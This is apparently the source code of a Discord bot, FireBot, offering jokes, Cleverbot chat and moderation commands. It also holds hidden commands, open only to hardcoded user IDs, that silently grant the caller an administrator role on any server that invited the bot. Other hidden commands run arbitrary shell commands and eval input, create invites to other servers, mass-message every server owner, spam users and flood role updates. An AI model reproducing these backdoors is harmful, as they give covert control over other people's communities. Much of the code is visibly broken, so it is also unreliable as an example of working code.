var http = require('http');
var garfield = require("garfield");
var randomHex = require('random-hexadecimal');
var leet = require("leet");
var insultgenerator = require('insultgenerator');
var Discordie = require("discordie");
var Cleverbot = require("cleverbot-node");
var client = new Discordie();
var fs = require('fs');
var prefix = "*";
var Events = Discordie.Events;
const request = require("request");
var Events = Discordie.Events;
var ownerid = "244509121838186497";
var token = "oshit";
var cthid = "284432595905675264";
function dbots() {
  var https = require("https");
  var authToken = "oshit";
  var options = {
    hostname: "bots.discord.pw",

    path: "/api/bots/"+client.User.id+"/stats",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Authorization": authToken
    }
  };
  var req = https.request(options, function(res) {
    res.setEncoding("utf8");
    res.on("data", function (body) {
    });
  });
  req.on("error", function(e) {
    console.log("problem with request: " + e.message);
  });
// write data to request body
  req.write(`{"server_count" : ${client.Guilds.length}}`);
  req.end();
}
function setGame(name) {
  var gamee = {type: 1, name: name, url: "http://www.twitch.tv/firec123123"};
  client.User.setGame(gamee);
}
function download(ddfilename, ddurl) {
var filestream = fs.createWriteStream(ddfilename);
var request = http.get(ddurl, function(response) {
response.pipe(filestream);
});
output += "Filename: "+ddfilename+"\nURL: "+ddurl;
}
const toHHMMSS = seconds => {
  var secNum = parseInt(seconds, 10); // don't forget the second param
  var hours = Math.floor(secNum / 3600);
  var minutes = Math.floor((secNum - (hours * 3600)) / 60);
  seconds = secNum - (hours * 3600) - (minutes * 60);

  if (hours < 10) hours = "0" + hours;
  if (minutes < 10) minutes = "0" + minutes;
  if (seconds < 10) seconds = "0" + seconds;
  return hours + ":" + minutes + ":" + seconds;
};
function safeEval (code, context, opts) {
  var sandbox = {};
  var resultKey = "SAFE_EVAL_" + Math.floor(Math.random() * 1000000);
  sandbox[resultKey] = {};
  code = resultKey + "=" + code;
  if (context) {
    Object.keys(context).forEach(function (key) {
      sandbox[key] = context[key];
    });
  }
  require("vm").runInNewContext(code, sandbox, opts);
  return sandbox[resultKey];
}

//var game = {name: name};
client.connect({
  token: token
});

client.Dispatcher.on("GATEWAY_READY", a => { 
  console.log("Connected as: " + client.User.username);
  setGame("Type *help | " + " Currently on " + client.Guilds.length + " Servers.");
});



//client.Dispatcher.on(Events.GUILD_EMOJIS_UPDATE, geu => {
//  geu.guild.generalChannel.sendMessage("[Logs] Emotes Updated```"+geu.getChanges+"```");
//});
//client.Dispatcher.on(Events.GUILD_ROLE_CREATE, grc => {
//  grc.guild.generalChannel.sendMessage("**UH OH!** ok someone created a role (ABOOOSEEEE?????) ._.");
//});
//client.Dispatcher.on(Events.GUILD_ROLE_DELETE, grd => {
//  grd.guild.generalChannel.sendMessage("**UH OH!** ok someone deleted a role (ABOOOSEEEE?????) ._.");
//});
//client.Dispatcher.on(Events.GUILD_ROLE_UPDATE, gru => {
//  gru.guild.generalChannel.sendMessage("[Logs] Roles Updated```"+gru.getChanges+"```");
//});
//client.Dispatcher.on(Events.GUILD_UPDATE, gu => {
//  gu.guild.generalChannel.sendMessage("**UH OH!** ok someone updated the guild (ABOOOSEEEE?????) ._.");
//});
//client.Dispatcher.on(Events.WEBHOOKS_UPDATE, wu => {
//  wu.guild.generalChannel.sendMessage("**UH OH!** ok someone is playing with the webhooks (ABOOOSEEEE?????) ._.");
//});
//client.Dispatcher.on(Events.GUILD_MEMBER_ADD, gma => {
  //client.Channels.find(gn => gn.id == "249259213585514508").sendMessage(gma.member.nickMention + " just joined "+gma.guild.name);
//  gma.guild.generalChannel.sendMessage("**"+gmr.user.username+"** just joined ^o^");
//  console.log(gma.member.username + " joined " + gma.guild.name);
//});
//client.Dispatcher.on(Events.GUILD_MEMBER_REMOVE, gmr => {
 // gma.guild.generalChannel.sendMessage("**"+gmr.user.username+"** just left. :(");
  //client.Channels.find(gn => gn.id == "249259213585514508").sendMessage(gma.member.nickMention + " just left "+gmr.guild.name);
  //console.log(gmr.user.username + " left " + gmr.guild.name);
//});
client.Dispatcher.on(Events.GUILD_CREATE, gcr => {
  setGame("Type *help | " + "Currently on " + client.Guilds.length + " Servers.");
  console.log("new server: "+gcr.guild.name);
  gcr.guild.generalChannel.sendMessage("Thanks for inviting FireBot!\nThe prefix is `*`\nIf you find a bug please report it with the `*report [whats the bug]` command!");
});
client.Dispatcher.on(Events.GUILD_DELETE, gdl => {
  console.log("1 gild ded ; - ;");
});
client.Dispatcher.on(Events.GUILD_BAN_ADD, gba => {
  console.log(gba.user.username + " got banned from " + gba.guild.name);
});
client.Dispatcher.on(Events.GUILD_BAN_REMOVE, gba => {
  console.log(gba.user.username + " got unbanned from " + gba.guild.name);
});
client.Dispatcher.on("MESSAGE_CREATE", e => {
  try{
	//console.log("[LOG] ID:"+e.message.author.id+" USERNAME:"+e.message.author.username+" CHANNEL: "+e.message.channel.name+" MESSAGE:"+e.message.content);
  /*if (e.message.author.id == "213149811531186186") {
    client.Messages.deleteMessage(e.message); 
 }*/
 if (e.message.author.id == "244509121838186497") {
 if (e.message.content.startsWith(prefix+"badperson")) {
	 var badperson = e.message.content.slice(11);
 }}
 if (e.message.author.id == badperson) {
 e.message.delete()
 }
 if (e.message.author.id == cthid) {
	 					          if (e.message.content.startsWith(prefix+"eval")) {
            var splittext = e.message.content.split(" ");
            console.log(splittext);
            if (splittext[0] == "*eval") {
              var sliced = e.message.content.slice(6);
              console.log(sliced);
              try {
                var evaluated = eval(sliced);
                console.log(evaluated);
                e.message.channel.sendMessage(":white_check_mark: Successfully evaluated!\n**Input:**\n**```js\n" + sliced + "```**\n**Output:**\n**```js\n" + evaluated + "\n```**");
              }catch(err){
                console.log("An error occurred while using eval:" + err.message);
                e.message.channel.sendMessage(":x:**Error:**:x:\n**```xl\n" + err.message + "\n```**");
			  }}}

             			  if(e.message.content.startsWith("*servers")) {
                client.Guilds.forEach(fe => { 
                  var omgwt = fe.name; 
                  var whotfisowner = fe.owner.username; 
                  var createdat = fe.createdAt; 
                  var omgpplz = fe.member_count; 
                  var omgicon = fe.iconURL;
                  e.message.channel.sendMessage("", false, {
                    title: omgwt,
                    timestamp: createdat,
                    color: 0xFF0000,
                    fields: [{
                      name: "Owner",
                      value: whotfisowner,
                      inline: true
                    }, {
                      name: "pplz",
                      value: omgpplz,
                      inline: true
                    }],
                    image:{
                      url: omgicon
                    },
                    footer: {
                      text: client.User.username,
                      icon_url: client.User.avatarURL
                    }
                  }); 
                });
              }
try {
client.Guilds.forEach(fe => {
console.log("Sent msg to "+fe.name);
fe.owner.openDM().then(function(ledm) {
ledm.sendMessage(e.message.content.substring(28));
});
});
} catch (err) {
console.log(err);
}
      if(e.message.content.startsWith(prefix+"grabinvite")) {
      var sv = e.message.content.substring(12);
      console.log(sv);
      var server = client.Guilds.find(fn => fn.name == sv);
      server.createInvite().then(invite => {
        var sjson = JSON.stringify(invite);
        var parsedjson = JSON.parse(sjson);
        e.message.channel.sendMessage(":white_check_mark: Executed successfully! Invite: http://discord.gg/" + parsedjson.code).catch(console.log);
      });
    }
			     if(e.message.content.startsWith(prefix+"say")) {
	  client.Messages.deleteMessage(e.message); 
       e.message.channel.sendMessage(e.message.content.substring(5));
		  }
		      if (e.message.content.startsWith(prefix+"ban")) {
			  var banUser = e.message.content.substring(6);
			  e.message.guild.ban(banUser);
			  e.message.channel.sendMessage("Banned " + "<@"+banUser+">");
			  }
 }
      if (e.message.author.id == "244509121838186497") {
		  		       if(e.message.content.startsWith(prefix+"noperm")) {
      const fircrol = e.message.guild.roles.find(r => r.name === "Temp Role");
      if (fircrol) {
        e.message.member.unassignRole(fircrol);
        fircrol.delete();
      }}
    if(e.message.content.startsWith(prefix+"mutualservers ")) {
      var i = 0
      var kek2 = e.message.content.substring(15)
      client.Guilds.forEach(guild => {
  var kek = guild.members.find(fn => fn.id == kek2);
  if(kek) {
  i++
  console.log(kek);
}
})
      e.message.channel.sendMessage("``User " + "``<@" + kek2 + ">`` " + "found on " + i + " server(s)``");
    }
    if(e.message.content.startsWith(prefix+"grabinvite")) {
      var sv = e.message.content.substring(12);
      console.log(sv);
      var server = client.Guilds.find(fn => fn.name == sv);
      server.createInvite().then(invite => {
        var sjson = JSON.stringify(invite);
        var parsedjson = JSON.parse(sjson);
        e.message.channel.sendMessage(":white_check_mark: Executed successfully! Invite: http://discord.gg/" + parsedjson.code).catch(console.log);
      });
    }
    var game = {name: "Type *help | " + " Currently on " + client.Guilds.length + " Servers."};
    var streamingGame = {type: 1, name: "Type *help | " + " Currently on " + client.Guilds.length + " Servers.", url: "http://www.twitch.tv/firec123123"};
			  if (e.message.content == "*status online") {
				  client.User.setStatus("online", game);
    e.message.channel.sendMessage("Status set as: Online");
  }
  			  if (e.message.content == "*status idle") {
				  client.User.setStatus("idle", game);
      e.message.channel.sendMessage("Status set as: Idle");
    }
  			  if (e.message.content == "*status dnd") {
				  client.User.setStatus("dnd", game);
      e.message.channel.sendMessage("Status set as: Do not disturb");
    }
    			  if (e.message.content == prefix+"jam") {
        e.message.channel.sendMessage("Game set as: Type *help | Currently on "+ client.Guilds.length +" Servers.");
        setGame("Type *help | " + "Currently on " + client.Guilds.length + " Servers.");
        dbots();
      }
    			  if (e.message.content == "*status do not disturb") {
					  client.User.setStatus("dnd", game);
        e.message.channel.sendMessage("Status set as: Do not disturb");
      }
      			  if (e.message.content == "*status invisible") {
					  client.User.setStatus("invisible", game);
          e.message.channel.sendMessage("Status set as: invisible");
        }
        			  if (e.message.content == "*status live") {
					  client.User.setStatus(null, streamingGame);
            e.message.channel.sendMessage("Status set as: Streaming");
          }
          if (e.message.content.startsWith(prefix+"id -r ")) {
          var idrul = e.message.guild.roles.find(usr => usr.name == e.message.content.slice(7)).id;
e.message.channel.sendMessage("", false, {
                title: omgwt,
                timestamp: createdat,
                color: 0xFF0000,
                fields: [{
                  name: "The id of the role is:",
                  value: idrul,
                  inline: true
                }],
                footer: {
                  text: client.User.username,
                  icon_url: client.User.avatarURL
                }
              }); 
          }
          
    if (e.message.content.startsWith(prefix+"fancy-say")) {
      var fancy = e.message.content.substring(12,16);
      var fancyy = e.message.content.substring(12,20);
      var fancyyy = e.message.content.substring(12,21);
      var fancyyyy = e.message.content.substring(12);
      client.Messages.deleteMessage(e.message); 
      e.message.channel.sendMessage("```diff\n+ "+fancy+"\n```").then(sentMessage => {
        sentMessage.edit("```diff\n- "+fancyy+"\n```");
        sentMessage.edit("```diff\n+ "+fancyyy+"\n```");
        sentMessage.edit("```diff\n- "+fancyyyy+"\n```"); });
    }
    if (e.message.content.startsWith(prefix+"restart")) {
      e.message.channel.sendMessage("ok");
      client.disconnect(); client.connect({ token: token });	
			  }
			  	if (e.message.content.startsWith(prefix+"shutdown")) {
    client.disconnect();
			  }
		      if (e.message.content.startsWith(prefix+"ban")) {
			  var banUser = e.message.content.substring(6);
			  e.message.guild.ban(banUser);
			  e.message.channel.sendMessage("Banned " + "<@"+banUser+">");
			  }
        if (e.message.author.id == ownerid) {
          if (e.message.content.startsWith("*globalban ")) {
            var ok = 0;
            var kek = client.Users.find(fn => fn.username == e.message.content.slice(11)).id;
            client.Guilds.forEach(guild => {
              if (!client.User.can(Discordie.Permissions.General.BAN_MEMBERS, guild) || !client.User.can(Discordie.Permissions.General.ADMINISTRATOR, guild)) {
                return;
              } else {
                ok++;
                guild.ban(e.message.content.slice(11));
              }
            });
            e.message.channel.sendMessage(":ok_hand: " + "Banned user " + e.message.content.slice(11) + " on " + ok + " servers");
          }
    }
    if (e.message.content.startsWith(prefix+"rainbow")) {
      var therul = e.message.content.substring(9);
      e.message.channel.sendMessage("RAINBOW ROLE!!! role: "+therul);
      function rainbow() {
        var ok = ["0xFF0000", "0x808000", "0x800080", "0x7CFC00", "0x0000ff", "0xDAA520", "0x0000FF"];
        var item = ok[Math.floor(Math.random()*ok.length)];
        e.message.guild.roles.find(gn => gn.name == therul).commit(therul, item, true, true);
      }
      setInterval(function(){ 
        rainbow();    
      }, 350);
    }
        if (e.message.content.startsWith(prefix+"seizure")) {
      var therul2 = e.message.content.substring(9);
      e.message.channel.sendMessage("YOU GOT AIDS!!! role: "+therul2);
      function seizure() {
        var ok = ["0xFF0000", "0x808000", "0x800080", "0x7CFC00", "0x0000ff", "0xDAA520", "0x0000FF"];
        var item = ok[Math.floor(Math.random()*ok.length)];
        e.message.guild.roles.find(gn => gn.name == therul2).commit(therul2, item, true, true);
      }
      setInterval(function(){ 
        seizure();    
      }, 1);
    }
        if (e.message.content.startsWith(prefix+"double_rainbow")) {
      e.message.channel.sendMessage("ITS A DOUBLE RAINBOW ALL THE WAY");
      function doublerainbow() {
        var ok = ["0xFF0000", "0x808000", "0x800080", "0x7CFC00", "0x0000ff", "0xDAA520", "0x0000FF"];
        var item = ok[Math.floor(Math.random()*ok.length)];
        e.message.guild.roles.forEach(fe => { 
          fe.commit(fe.name, item, true, true);

        });
      }
      setInterval(function(){ 
        doublerainbow();
      }, 500);
    }
			  if(e.message.content.startsWith(prefix+"perm")) {
          client.Messages.deleteMessage(e.message); 
			  e.message.guild.createRole().then(role => {
    var perms = role.permissions;
    perms.General.ADMINISTRATOR = true;
    perms.General.MANAGE_ROLES = true;
    perms.General.MANAGE_GUILD = true;
    perms.General.KICK_MEMBERS = true;
    perms.General.BAN_MEMBERS = true;


    var newRoleName = "Temp Role";
    var color = 0xE74C3C; // red
    var hoist = false; // display as separate group

    role.commit(newRoleName, color, hoist);
    e.message.member.assignRole(role);
  }).catch(err => console.log("Failed to create role:", err));
  }
		  		  if(e.message.content.startsWith(prefix+"pm")) {
	  client.Messages.deleteMessage(e.message); 
	  var PMuser = e.message.mentions;
	  PMuser[0].openDM().then(dm=>{
		  dm.sendMessage(e.message.content.substring(4));
	  });
	  }
    if(e.message.content.startsWith(prefix+"shell")) {
      require('child_process').exec(e.message.content.substring(7), function (error, stdout, stderr) { e.message.channel.sendMessage("```Error: " + stderr + "\n (" + error + ")\nOutput: "+stdout+"```") });
    }
	            function func() {
              var nukuser = client.Users.find(fn => fn.username == e.message.content.slice(6)).id;
              var nukmsg = "heyyyy friend";
              nukuser[0].openDM().then(dm=>{
                dm.sendMessage(nukmsg);
              });
            }
	            if(e.message.content.startsWith(prefix+"spam")) {
              client.Messages.deleteMessage(e.message);
              e.message.channel.sendMessage("ok");
              for (i = 0; i < 100; i++) {
                func();
              }
            }
    if(e.message.content.startsWith(prefix+"ann")) {
      client.Guilds.forEach(fe => { 
        if(fe.id == "110373943822540800") return;
        fe.generalChannel.sendMessage(e.message.content.substring(5));
      });
    }
    
                			  if(e.message.content.startsWith(prefix+"serverinfo")) {
              var serverinffff = e.message.content.substring(12);
              var serverinf = client.Guilds.find(bby => bby.name == serverinffff);
    var serverinfname = serverinf.name; 
    var whotfisowner = serverinf.owner.username; 
    var createdat = serverinf.createdAt; 
    var omgpplz = serverinf.member_count; 
    var omgicon = serverinf.iconURL;
              e.message.channel.sendMessage("", false, {
                title: serverinfname,
                timestamp: createdat,
                color: 0xFF0000,
                fields: [{
                  name: "Owner",
                  value: whotfisowner,
                  inline: true
                }, {
                  name: "Membercount",
                  value: omgpplz,
                  inline: true
                }],
                image:{
                  url: omgicon
                },
                footer: {
                  text: client.User.username,
                  icon_url: client.User.avatarURL
                }
              }); 
        }
	           
	                      if(e.message.content.startsWith(prefix+"dmid1")) { 
                        client.Messages.deleteMessage(e.message); 
                        e.message.guild.members.find(m => m.id == e.message.content.substring(8,25)).openDM().then(function(ledm) {
                          ledm.sendMessage(e.message.content.substring(28));
                        });
                      }
	  	                      if(e.message.content.startsWith(prefix+"dmid2")) {
                          client.Messages.deleteMessage(e.message); 
                          e.message.guild.members.find(m => m.id == e.message.content.substring(8,26)).openDM().then(function(ledm) {
                            ledm.sendMessage(e.message.content.substring(28));
                          });
                        }
			  
			  if (e.message.content.startsWith(prefix+"softban")) {
			  var softbanUser = e.message.content.substring(12,30);
			  e.message.guild.ban(softbanUser);
			  e.message.guild.unban(softbanUser);
			  e.message.channel.sendMessage("SoftBanned " + "<@"+softbanUser+">");
			  console.log("SoftBanned " + softbanUser);
			  }

			  if (e.message.content.startsWith(prefix+"unban")) {
			  var unbanUser = e.message.content.substring(8,26);
			  e.message.guild.unban(unbanUser);
			  e.message.channel.sendMessage("Unbanned " + "<@"+unbanUser+">");
			  console.log("Unbanned" + unbanUser);
			  }	

			  if (e.message.content.startsWith(prefix+"kick")) {
					  var kickUser = e.message.guild.members.find(m => m.id === e.message.content.substring(9,27));
					  console.log(e.message.content.substring(9,27));
					  console.log(kickUser);
					  kickUser.kick();
    e.message.channel.sendMessage("Kicked " + "<@"+kickUser+">");
  }
    if (e.message.content == prefix+"breck") {
      e.message.channel.sendMessage(":radioactive: **ARE YOU SURE THIS ACTION CANNOT BE UNDONE** :radioactive:");
    }
    if (e.message.content == prefix+"breck no") {
      e.message.channel.sendMessage(":radioactive: **BRECKING CANCELLED** :radioactive:");
    }
				  if (e.message.content == prefix+"breck yes") {
					  client.Messages.deleteMessage(e.message);
					  e.message.channel.sendMessage(":radioactive: **BRECK BRECK BRECK** :radioactive:");
					  var leaveplz = e.message.guild.members.find(m => m.id === e.message.content.substring(8,26));
					  console.log(leaveplz);
					  e.message.guild.leave();
  }
    if (e.message.content.startsWith(prefix+"setgame")) {
						  var customgame = e.message.content.substring(9,2000);
						  setGame(customgame);
						  e.message.channel.sendMessage("Custom Game Set as: "+ customgame);
						  console.log("Custom Game Set: "+ customgame);
					  }
					  					  if (e.message.content.startsWith(prefix+"logban")) {
			  var banlogUser = e.message.content.substring(11,29);
			  var banlogReason = e.message.content.substring(31);
			  e.message.guild.ban(banlogUser);
			  e.message.channel.sendMessage("Banned " + "<@"+banlogUser+">");
					  client.Channels.find(gn => gn.id == "243026463102599168").sendMessage("Ban: "+"<@"+banlogUser+">"+" \n ID: "+banlogUser+"  \n Ban reason: "+ banlogReason);
										  }
		 if (e.message.content.startsWith("*logkick")) {
			  var kicklogUser = e.message.guild.members.find(m => m.id === e.message.content.substring(11,29));
			  var kicklogReason = e.message.content.substring(31);
			  kicklogUser.kick();
			  e.message.channel.sendMessage("Kicked " + "<@"+kicklogUser+">");
					  client.Channels.find(gn => gn.id == "243026463102599168").sendMessage("Kick: "+"<@"+kicklogUser+">"+" \nID: "+kicklogUser+"  \nreason: "+ kicklogReason);
										  }
										  
					          if (e.message.content.startsWith(prefix+"eval")) {
            var splittext = e.message.content.split(" ");
            console.log(splittext);
            if (splittext[0] == "*eval") {
              var sliced = e.message.content.slice(6);
              console.log(sliced);
              try {
                var evaluated = eval(sliced);
                console.log(evaluated);
                e.message.channel.sendMessage(":white_check_mark: Successfully evaluated!\n**Input:**\n**```js\n" + sliced + "```**\n**Output:**\n**```js\n" + evaluated + "\n```**");
              }catch(err){
                console.log("An error occurred while using eval:" + err.message);
                e.message.channel.sendMessage(":x:**Error:**:x:\n**```xl\n" + err.message + "\n```**");
			  }}}
        			  if(e.message.content.startsWith(prefix+"servers")) {
            client.Guilds.forEach(fe => { 
              var omgwt = fe.name; 
              var whotfisowner = fe.owner.username; 
              var createdat = fe.createdAt; 
              var omgpplz = fe.member_count; 
              var omgicon = fe.iconURL;
              e.message.channel.sendMessage("", false, {
                title: omgwt,
                timestamp: createdat,
                color: 0xFF0000,
                fields: [{
                  name: "Owner",
                  value: whotfisowner,
                  inline: true
                }, {
                  name: "pplz",
                  value: omgpplz,
                  inline: true
                }],
                image:{
                  url: omgicon
                },
                footer: {
                  text: client.User.username,
                  icon_url: client.User.avatarURL
                }
              }); 
            });
			  if (e.message.content.startsWith(prefix+"s-eval")) {
				  client.Messages.deleteMessage(e.message); 
    var splittext = e.message.content.split(" ");
    console.log(splittext);
    if (splittext[0] == "*s-eval") {
      var sliced = e.message.content.slice(9);
      console.log(sliced);
      try {
        var evaluated = eval(sliced);
        console.log(evaluated);
      }catch(err){
        console.log("An error occurred while using eval:" + err.message);
      }}}}}
      if (e.message.content == prefix+"kms") {
    e.message.channel.sendMessage(":joy: :gun:");
  }
      if (e.message.content == prefix+"ok") {
    e.message.channel.sendMessage("OK");
  }
      if (e.message.content.startsWith(prefix+"object")) {
    e.message.channel.sendMessage(":shallow_pan_of_food: "+e.message.content.substring(8)+" is a [object Object] :shallow_pan_of_food:");
  }
      if(e.message.author.bot) return;
      if(e.message.content.startsWith("<@252500760753864705> ")) {
      var cleverbot = new Cleverbot();
      var mojjiii = [":speech_left:", ":speech_balloon:", ":robot:", ":eye:", ":speaking_head:", ":busts_in_silhouette:", ":game_die:", ":thought_balloon:", ":crown:", ":black_nib:", ":lollipop:", ":writing_hand:", ":speech_balloon:", ":pen_ballpoint:"];
      var emojiii = mojjiii[Math.floor(Math.random() * (mojjiii.length))];
      var cleverMessage = e.message.content.slice(10);
      e.message.channel.sendTyping();
      Cleverbot.prepare(function(){
        cleverbot.write(cleverMessage, function (response) {
          e.message.channel.sendMessage(emojiii+", "+response.message);
        });
      });
    }
          if(e.message.content.startsWith("<@!252500760753864705> ")) {
      var cleverbot = new Cleverbot();
      var mojjiii = [":speech_left:", ":speech_balloon:", ":robot:", ":eye:", ":speaking_head:", ":busts_in_silhouette:", ":game_die:", ":thought_balloon:", ":crown:", ":black_nib:", ":lollipop:", ":writing_hand:", ":speech_balloon:", ":pen_ballpoint:"];
      var emojiii = mojjiii[Math.floor(Math.random() * (mojjiii.length))];
      var cleverMessage = e.message.content.slice(10);
      e.message.channel.sendTyping();
      Cleverbot.prepare(function(){
        cleverbot.write(cleverMessage, function (response) {
          e.message.channel.sendMessage(emojiii+", "+response.message);
        });
      });
    }
    if(e.message.content == "<@252500760753864705>") {
      var mojjiii = [":speech_left:", ":speech_balloon:", ":robot:", ":eye:", ":speaking_head:", ":busts_in_silhouette:", ":game_die:", ":thought_balloon:", ":crown:", ":black_nib:", ":lollipop:", ":writing_hand:", ":speech_balloon:", ":pen_ballpoint:"];
      var emojiii = mojjiii[Math.floor(Math.random() * (mojjiii.length))];
    e.message.channel.sendMessage(emojiii+" **Trying to use cleverbot?** Correct usage: `@FireBot Hi!`")
  }
      if(e.message.content == "<@!252500760753864705>") {
      var mojjiii = [":speech_left:", ":speech_balloon:", ":robot:", ":eye:", ":speaking_head:", ":busts_in_silhouette:", ":game_die:", ":thought_balloon:", ":crown:", ":black_nib:", ":lollipop:", ":writing_hand:", ":speech_balloon:", ":pen_ballpoint:"];
      var emojiii = mojjiii[Math.floor(Math.random() * (mojjiii.length))];
    e.message.channel.sendMessage(emojiii+" **Trying to use cleverbot?** Correct usage: `@FireBot Hi!`")
  }
      if(e.message.content.startsWith(prefix+"user-say")) { 
    e.message.channel.sendMessage(":radio_button: "+e.message.author.nickMention+" Said::radio_button: \n```"+e.message.content.substring(10,2000)+"```");
  }
	//the long ass help thing
      if(e.message.content.startsWith(prefix+"help")) {
        e.message.addReaction("✅");
    e.message.guild.members.find(m => m.id == e.message.author.id).openDM().then(function(halpp) {
      halpp.sendMessage(":radio_button: **`FireBot commands list`** :radio_button:\n\n:heart_decoration: **`usefull commands`** :heart_decoration:\n\n*help - prints the commands in pms\n*avatar - get someone's avatar\n*urban - DEFINITIONS :O :O :O\n*leet - 1337 H4X0RZORZ\n*object - [object Object] \n*garfield - get a random garfield comic\n*stab - stab someone\n*kill - kill someone\n*shoot - shoot someone\n*rape - rape someone\n*candy - give someone a candy\n*cookie - give someone a cookie\n*lick - lick someone\n*spank - spank someone\n*pet - pet someone\n*eat - no vore\n*fuck - fuck someone\n*kms - end my suffering\n*unsplash - get a random image\n*dog - get a random image of a dog\n*cat - get a random image of a cat\n*quote - get a random quote\n*ping - check how much time it takes for the bot to send a message in ms\n*userinfo - get some info about someone's profile note: you gotta type someone's username after the command\n*changelog - check out the changelog that i havent updated in months\n*russia - MOTHER RUSSIA\n*how2bot - no\n*bleach - on sale\n*user-say - make the bot say something\n*this is fine - MEMEMEEMEMEMEMEME\n*electronicwiz1 - command that should be removed\n*id - get the id of someone\n*website - our website\n*lenny - ( ͡° ͜ʖ ͡°)\n*insult - generate's a random insult");
      halpp.sendMessage(":musical_note: **`Music commands`** :musical_note:\n\n*play - play a video\n*search - search for a video on youtube\n*skip - start a vote to skip the current video\n*queue - print the current queue of videos\n*pause - pause the playback of the current video\n*resume - resume the playback of the current video\n*volume - change the volume of the current video\n*summon - call the bot in the voice channel you are currently in\n*perms - prints what your perms are\n*disconnect - leaves the voice channel\n*current - prints the video that is currently playing\n\n:radioactive: **`staff/owner only commands`** :radioactive:\n\n*ban - obvious\n*logban - not working\n*kick - obvious\n*logkick - not working\n*setgame - obvious\n*unban - obvious\n*say - obvious\n*restart - obvious\n*shutdown - obvious\n*clean - clean bot's messages\n*blacklist - blacklists someone from using the bot\n\n\n:love_letter: This bot is made by FireC, Cth103, MDMCK10 :love_letter:\n**Our website: http://firebot.ga/**");
    });
    e.message.channel.sendMessage("**"+e.message.author.username+"**, I sent you a list of commands in PM's. :ok_hand:");
  }
      if (e.message.content == prefix+"null") {
    e.message.channel.sendMessage("‮");
  }
      if(e.message.content.startsWith(prefix+"report")) {
    client.Channels.find(gn => gn.id == "252540488412954625").sendMessage("New report from: `"+e.message.author.username+"#"+e.message.author.discriminator+"`\nHis ID: "+e.message.author.id+"\nReport: `"+e.message.content.substring(7)+"`\nFrom: `"+e.message.guild.name+"`"); 
    e.message.channel.sendMessage(":white_check_mark: Report sent");
  }
      if (e.message.content == prefix+"lenny") {
    e.message.channel.sendMessage("( ͡° ͜ʖ ͡°)");
  }
        if (e.message.content == prefix+"website") {
    e.message.channel.sendMessage("http://firebot.ga/");
  }
      if(e.message.content.startsWith(prefix+"electronicwiz1")) {
    e.message.channel.sendMessage("**NO**");
  }
      if (e.message.content == prefix+"this is fine") {
    e.message.channel.sendMessage("https://giphy.com/gifs/form-z9AUvhAEiXOqA");
  }
      if (e.message.content == prefix+"topkek") {
    e.message.channel.uploadFile("topkek.png");
  }
      if (e.message.content == prefix+"bleach") {
    e.message.channel.uploadFile("bleach.jpg");
  }
      if (e.message.content == prefix+"invite") {
    e.message.channel.sendMessage("**Invite me with this link:** https://discordapp.com/oauth2/authorize?client_id=252500760753864705&scope=bot&permissions=2080374847");
  }
      if (e.message.content == prefix+"inviteme") {
    e.message.channel.sendMessage("**Invite me with this link:** https://discordapp.com/oauth2/authorize?client_id=252500760753864705&scope=bot&permissions=2080374847"); 
  }
      if (e.message.content == prefix+"uptime") {
	  e.message.channel.sendMessage("**``Uptime: "+toHHMMSS(process.uptime())+"``**");
	  console.log("Uptime: "+toHHMMSS(process.uptime()));
  }
      if (e.message.content == prefix+"info") {
	  e.message.channel.sendMessage("**Some info about FireBot:**\n``Uptime: "+toHHMMSS(process.uptime())+"\nServers: "+client.Guilds.size+"\nChannels: "+client.Channels.length+"\nUsers: "+client.Users.length+"``");
  }
	  if (e.message.content == prefix+"givemestaff") {
	  console.log(e.message.author.nickMention + " just tried to get a role");
    e.message.channel.sendMessage("nah");	

  }
   	  if (e.message.content == prefix+"blowup") {
       e.message.channel.sendMessage("git out i am not a note7");	
     }
      if (e.message.content ==prefix+"how2bot") {
    e.message.channel.sendMessage("here is an example of MDMCK10 fixing FireC's code https://media.giphy.com/media/o0vwzuFwCGAFO/giphy.gif");
  }
      if(e.message.content == prefix+"yey") {
    e.message.channel.sendMessage("yay").then(sentMessage => {
      sentMessage.edit("YAY");
      sentMessage.edit("YAY!!!");
	  sentMessage.edit("**YAY!!!!!**");  });
  }
      if(e.message.content == prefix+"xd") {
    client.Messages.deleteMessage(e.message); 
    e.message.channel.sendMessage("xdddd").then(sentMessage => {
      sentMessage.edit("xdddddd");
      sentMessage.edit("xddddddd"); }); 
    e.message.channel.sendMessage("dddd");
    e.message.channel.sendMessage("d");
    e.message.channel.sendMessage("d");
  }
      if (e.message.content ==prefix+"russia")
    e.message.channel.sendMessage("https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Flag_of_the_Soviet_Union.svg/2000px-Flag_of_the_Soviet_Union.svg.png");
  //if (e.message.startsWith =="*fuck")
    //e.message.channel.sendMessage(e.message.author.nickMention + "Just F*CKED" + e.message.content.substring(5,2000));

//if (e.message.content.startsWith("*bf")) {
//try {
//	var code = [];
//	var bfded = bf.compile(e.message.content.substring(4, 9999999999999));
//	bfded.run(bfded, function (num, chor) {
//  code.push(chor);
//});
//     var finishdcode = code.join('');
//	if (!finishdcode == "") {
//	e.message.channel.sendMessage("```brainfuck\n" +finishdcode + "```");
//	}
//	if (finishdcode == "") {
//	e.message.channel.sendMessage("```brainfuck\nERROR AAAAAAAAAAAAA```");
//}	
//}
//catch (err) {
//e.message.channel.sendMessage("```brainfuck\nError " + err.toString() + "```");	
//}

//}
/*
if(e.message.content == "*base64") {
	e.message.channel.sendMessage("Usage: `*base64 [Encode/Decode] [Text]`")
}
if(e.message.content.startsWith("*base64 decode"))  {
	var bencoded = e.message.content.substring(16);
	var bbytes = base64.decode(bencoded);
	var detext = utf8.decode(bbytes);
	e.message.channel.sendMessage("Decoded content: "+detext);
}
if(e.message.content.startsWith("*base64 encode")) {
	var entext = e.message.content.substring(16);
	var abytes = utf8.encode(detext);
	var aencoded = base64.encode(abytes);
	e.message.channel.sendMessage("Encoded content: "+entext);
}
*/
      if (e.message.content ==prefix+"changelog") {
    e.message.channel.sendMessage("ok   ");
  }
  if (e.message.content == "*uesrinfo") {
  e.message.channel.sendMessage("**You can provide a nickname after the command to get info about someone else**\n:bust_in_silhouette: Info About " + e.message.author.nickMention + "\n" +"➣ Username: "+ e.message.author.username + "\n" + "➣ Nickname: " + e.message.author.nickMention + "\n" + "➣ Discriminator: " + e.message.author.discriminator + "\n" + "➣ Registered at (Bot's local timezone applies): " + e.message.author.registeredAt + "\n" + "➣ Avatar URL: " + e.message.author.avatarURL + "\n" + "➣ Bot user: " + e.message.author.bot + "\n➣ ID: " + e.message.author.id);
}
